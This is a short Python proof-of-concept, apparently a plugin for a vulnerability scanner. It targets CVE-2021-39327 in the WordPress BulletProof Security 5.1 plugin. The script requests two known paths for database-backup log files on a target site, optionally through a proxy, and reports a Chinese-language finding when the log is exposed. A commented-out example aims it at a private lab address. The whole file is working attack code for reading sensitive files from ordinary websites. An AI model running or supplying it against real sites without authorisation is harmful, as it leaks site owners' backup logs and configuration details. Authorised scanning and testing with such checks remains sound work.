# coding: utf-8
import requests
import random

#Wordpress Plugin BulletProof Security 5.1 - Sensitive Information Disclosure
def poc(url,user_agent,proxy):

    url = url.strip("/")
    header = {'User-Agent': user_agent}

    paths = ["/wp-content/bps-backup/logs/db_backup_log.txt",
             "/wp-content/plugins/bulletproof-security/admin/htaccess/db_backup_log.txt"]
    log=[]
    for i in paths:
        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = requests.get(url+i, headers=header, proxies=proxies)
        else:
            response = requests.get(url+i, headers=header)
        log.append(response.text)

    # print(response.text)

    if response.status_code==200 and 'BPS DB BACKUP LOG' in str(log):
        return 'Wordpress Plugin BulletProof Security 5.1 - 敏感信息泄露    漏洞编号：CVE-2021-39327'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')
